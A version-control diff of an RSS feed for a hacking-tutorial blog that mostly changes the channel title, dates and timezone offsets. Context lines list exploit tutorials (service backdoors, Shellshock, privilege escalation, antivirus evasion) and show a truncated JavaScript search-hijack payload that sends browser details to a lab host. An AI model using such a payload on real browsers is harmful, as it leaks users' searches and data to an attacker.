@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
-<channel><title>m3t4lk3y</title><link>https://metalkey.github.io/index.html</link>
+<channel><title>343</title><link>https://metalkey.github.io/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Mon, 24 Oct 2016 23:54:39 +1100</lastBuildDate>
-<pubDate>Mon, 24 Oct 2016 23:54:39 +1100</pubDate>
+<lastBuildDate>Sat, 28 Jan 2017 07:48:32 -0500</lastBuildDate>
+<pubDate>Sat, 28 Jan 2017 07:48:32 -0500</pubDate>
 <atom:link href="https://metalkey.github.io/feed.rss" rel="self" type="application/rss+xml" />
 <item><title>
 Company Email Enumeration + Breached Email Finder
@@ -57,7 +57,7 @@ root@kali:~#	<com>cat emails.sh</com><br>
 ]]></description><link>https://metalkey.github.io/company-email-enumeration--breached-email-finder.html</link>
 <guid>https://metalkey.github.io/./company-email-enumeration--breached-email-finder.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Mon, 24 Oct 2016 23:34:08 +1100</pubDate></item>
+<pubDate>Mon, 24 Oct 2016 23:34:08 -0400</pubDate></item>
 <item><title>
 Installing Wickr on Ubuntu 16.04
 </title><description><![CDATA[
@@ -93,7 +93,7 @@ Installing Wickr on Ubuntu 16.04
 ]]></description><link>https://metalkey.github.io/installing-wickr-on-ubuntu-1604.html</link>
 <guid>https://metalkey.github.io/./installing-wickr-on-ubuntu-1604.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Sat, 22 Oct 2016 18:13:57 +1100</pubDate></item>
+<pubDate>Sat, 22 Oct 2016 18:13:57 -0400</pubDate></item>
 <item><title>
 Port Scanning With Netcat (Up to 1000 ports/second)
 </title><description><![CDATA[
@@ -150,7 +150,7 @@ Port Scanning With Netcat (Up to 1000 ports/second)
 ]]></description><link>https://metalkey.github.io/port-scanning-with-netcat-up-to-1000pps.html</link>
 <guid>https://metalkey.github.io/./port-scanning-with-netcat-up-to-1000pps.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Sat, 08 Oct 2016 19:47:58 +1100</pubDate></item>
+<pubDate>Sat, 08 Oct 2016 19:47:58 -0400</pubDate></item>
 <item><title>
 Google Chrome Search Poison – Default Search Engine Exploit
 </title><description><![CDATA[
@@ -230,7 +230,7 @@ javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.produ
 ]]></description><link>https://metalkey.github.io/google-chrome-search-poison---default-search-engine-exploit.html</link>
 <guid>https://metalkey.github.io/./google-chrome-search-poison---default-search-engine-exploit.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Sat, 02 Jul 2016 20:37:36 +1000</pubDate></item>
+<pubDate>Sat, 02 Jul 2016 20:37:36 -0400</pubDate></item>
 <item><title>
 UnrealIRCD 3.2.8.1 Backdoor Command Execution
 </title><description><![CDATA[
@@ -300,11 +300,12 @@ root@metasploitable:/etc/unreal#
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/unrealircd-3281-backdoor-command-execution.html</link>
 <guid>https://metalkey.github.io/./unrealircd-3281-backdoor-command-execution.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Sat, 02 Jul 2016 19:11:59 +1000</pubDate></item>
+<pubDate>Sat, 02 Jul 2016 19:11:59 -0400</pubDate></item>
 <item><title>
 VSFTPD v2.3.4 Backdoor Command Execution
 </title><description><![CDATA[
@@ -354,7 +355,7 @@ root@metasploitable:/#
 ]]></description><link>https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html</link>
 <guid>https://metalkey.github.io/./vsftpd-v234-backdoor-command-execution.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Sat, 02 Jul 2016 19:05:03 +1000</pubDate></item>
+<pubDate>Sat, 02 Jul 2016 19:05:03 -0400</pubDate></item>
 <item><title>
 Linux Kernel 2.6 UDEV &lt; 141 – Local Privilege Escalation Exploit Example
 </title><description><![CDATA[
@@ -458,11 +459,12 @@ root
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</link>
 <guid>https://metalkey.github.io/./linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Sat, 02 Jul 2016 18:52:36 +1000</pubDate></item>
+<pubDate>Sat, 02 Jul 2016 18:52:36 -0400</pubDate></item>
 <item><title>
 Shellshock Explained + Exploitation Tutorial
 </title><description><![CDATA[
@@ -597,11 +599,12 @@ If your system is vulnerable, ensure it is patched immediately by upgrading your
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html</link>
 <guid>https://metalkey.github.io/./shellshock-explained--exploitation-tutorial.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Sat, 02 Jul 2016 18:01:02 +1000</pubDate></item>
+<pubDate>Sat, 02 Jul 2016 18:01:02 -0400</pubDate></item>
 <item><title>
 Shellter – The ultimate tool for AV evasion
 </title><description><![CDATA[
@@ -724,11 +727,12 @@ C:\7-ZipPortable>
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/shellter---the-ultimate-tool-for-av-evasion.html</link>
 <guid>https://metalkey.github.io/./shellter---the-ultimate-tool-for-av-evasion.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Fri, 01 Jul 2016 15:27:49 +1000</pubDate></item>
+<pubDate>Fri, 01 Jul 2016 15:27:49 -0400</pubDate></item>
 <item><title>
 Increasing the Power Output of your Alfa AWUS036H
 </title><description><![CDATA[
@@ -788,5 +792,5 @@ Higher values can also be set and detailed instructions are available at Null By
 ]]></description><link>https://metalkey.github.io/increasing-the-power-output-of-your-alfa-awus036h.html</link>
 <guid>https://metalkey.github.io/./increasing-the-power-output-of-your-alfa-awus036h.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Fri, 01 Jul 2016 15:11:09 +1000</pubDate></item>
+<pubDate>Fri, 01 Jul 2016 15:11:09 -0400</pubDate></item>
 </channel></rss>
